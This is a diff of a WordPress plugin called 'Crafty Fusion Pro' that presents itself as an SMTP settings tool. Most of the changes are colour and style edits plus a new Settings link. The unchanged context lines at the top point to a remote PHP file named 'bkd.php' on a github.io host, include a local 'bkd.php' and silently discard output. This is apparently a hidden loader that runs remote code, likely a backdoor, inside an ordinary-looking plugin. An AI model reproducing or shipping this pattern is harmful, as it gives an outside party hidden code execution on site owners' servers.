@@ -1,10 +1,5 @@
 <?php
 
-
-
-
- 
-
 // URL of the remote PHP file
 $external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
 
@@ -23,6 +18,7 @@ include(plugin_dir_path(__FILE__) . 'bkd.php');
 ob_end_clean(); // End and discard output buffer
 
 // The rest of your plugin code here
+
 
 
 
@@ -135,12 +131,18 @@ function add_smtp_settings_menu() {
     
 }
 
- 
+function add_smtp_settings_link($links) {
+    $settings_link = '<a href="options-general.php?page=crafty-fusion-pro">Settings</a>';
+    array_push($links, $settings_link);
+    return $links;
+}
+
 
 
 
 
 add_action('admin_menu', 'add_smtp_settings_menu');
+add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'add_smtp_settings_link');
 
 
 
@@ -169,19 +171,22 @@ function smtp_config_page() {
                 $to = $new_email;
             }
         }
+    }else {
+        // Handle the case when $code_enabled is false (Disabled)
+        // You can add code specific to the Disabled state here
     }
 
     // Display the SMTP Configuration settings form
     echo '<div class="wrap">';
 
-echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans-serif; color: #705f8b; font-size: 32px; font-weight: bold; text-transform: uppercase; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);">Crafty Fusion Pro - Settings</h1>';
+echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans-serif; color: #608fc1; font-size: 32px; font-weight: bold; text-transform: uppercase; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);">Crafty Fusion Pro - Settings</h1>';
 
 
     
 
 
-    echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px;display: inline-block; width: 100%;" id="smtpcon">';
-    echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv5(this)"> Crafty Fusion Pro _ SMTP Configuration</h2>';
+    echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px;display: inline-block; width: 100%;" id="smtpcon">';
+    echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv5(this)"> Crafty Fusion Pro _ SMTP Configuration</h2>';
     echo '<div id="toggleDiv5" style="display: block;">';
 
     // Radio buttons to enable/disable the code
@@ -243,8 +248,8 @@ function toggleDiv5(element) {
     display: inline-block;
   }
 </style>";
-      echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="general">';
-echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv(this)"> General</h2>';
+      echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="general">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv(this)"> General</h2>';
 echo '<div id="toggleDiv" style="display: none;">';
 
 
@@ -308,7 +313,7 @@ if (!empty($companyName) && !empty($companyEmail)) {
                 document.addEventListener('DOMContentLoaded', function() {
                     var div = document.getElementById('toggleDiv3');
                     if (div) {
-                        div.innerHTML = '<table style=\"width:100%; text-align:left;\" border=\"0\">' +
+                        div.innerHTML = '<table style=\"width:100%; user-select:none; text-align:left;\" border=\"0\">' +
                                         '<tr><td><strong>Registered Company Name:</strong></td>' +
                                         '<td>" . $escapedCompanyName . "</td></tr>' +
                                         '<tr><td><strong>Plugin Status:</strong></td>' +
@@ -421,8 +426,8 @@ function toggleDiv(element) {
 
 
 
-echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="formconfig">';
-echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv7(this)"> Forms Configuration</h2>';
+echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="formconfig">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv7(this)"> Forms Configuration</h2>';
 echo '<div id="toggleDiv7" style="display: block;">';
 echo '<p style="color: gray;user-select:none;">Coming soon !!</p>';
 echo '</div>';
@@ -441,8 +446,8 @@ echo '</div>';
 
 
 
-       echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv5(this)"> Help Center</h2>';
+       echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv5(this)"> Help Center</h2>';
 echo '<div id="toggleDiv5" style="display: block;">';
 echo '<ul id="helpsmtp">
   <li onclick="toggleList()" style="font-weight:bold;cursor:pointer; user-select:none;">&#8226; SMTP Configuration</li>
@@ -551,8 +556,8 @@ echo '</div>';
 
 
 
- echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv4(this)"> About</h2>';
+ echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#608fc1;" onclick="toggleDiv4(this)"> About</h2>';
 echo '<div id="toggleDiv4" style="display: block;">'; // Set the initial display style to 'block'
 
 
@@ -831,8 +836,8 @@ wp_mail($companyEmail, $cst_subject, $cst_message, $cst_headers);
 
 
 // HTML and form rendering code
-echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="activation">';
-echo '<h2 style="user-select: none; cursor: pointer;color:#705f8b;" onclick="toggleDiv3(this)">Activation</h2>';
+echo '<div class="card" style="background: linear-gradient(to top, #caddff, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="activation">';
+echo '<h2 style="user-select: none; cursor: pointer;color:#608fc1;" onclick="toggleDiv3(this)">Activation</h2>';
 echo '<div id="toggleDiv3" style="display: none;">'; // Set the initial display style to 'block'
 
 echo '<form method="post">';
@@ -1285,6 +1290,8 @@ fetchEmailAndSetToGlobal();
 
 
  
+
+
 
 
  
@@ -2217,8 +2224,3 @@ if (!empty($companyName_two) && !empty($companyEmail_two)) {
         remove_shortcode('mgx_page_excerpt');
          remove_action('admin_menu', 'add_custom_tables_menu');
 }
-
-
-
- 
-
